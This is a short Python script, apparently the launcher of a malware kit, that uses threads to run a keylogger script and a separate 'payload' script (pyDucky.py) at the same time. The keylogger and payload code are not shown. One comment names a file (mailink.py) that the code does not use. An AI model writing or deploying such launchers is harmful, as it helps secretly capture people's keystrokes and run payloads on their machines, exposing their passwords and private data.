import threading
import subprocess
import os

# Get the directory of weblogger.py
current_directory = os.path.dirname(os.path.realpath(__file__))

# Full paths of keylogger.py and mailink.py
keylogger_path = os.path.join(current_directory, "keylogger.py")
pyDucky_path = os.path.join(current_directory, "pyDucky.py")

def execute_payload_script():
    subprocess.run(['python', pyDucky_path])

def run_keylogger():
    subprocess.run(['python', keylogger_path])

if __name__ == '__main__':
    t1 = threading.Thread(target=run_keylogger)
    t2 = threading.Thread(target=execute_payload_script)

    t1.start()
    t2.start()


